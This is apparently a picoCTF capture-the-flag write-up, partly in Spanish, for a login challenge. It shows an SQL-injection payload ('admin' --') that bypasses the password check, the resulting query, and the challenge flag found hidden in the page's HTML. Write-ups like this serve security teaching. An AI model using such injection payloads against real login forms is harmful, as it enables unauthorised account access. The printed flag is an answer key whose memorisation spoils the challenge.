Can you login to this website?Try to login [here](http://saturn.picoctf.net:55605/).

Hints:
1. `admin` is the user you want to login as.

## Solución 1:
Realizando una inyección SQL sencilla la cual es meter "admin' --" en el usuario y se puede dejar vacía la contraseña
```
username: admin' --
password: 
SQL query: SELECT * FROM users WHERE name='admin' --' AND password=''

# Logged in! But can you see the flag, it is in plainsight.

	Al observar lo que se dice, decido inspeccionar el código y la flag se encontraba oculta en el html:
	</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}</p>
	
	picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}
```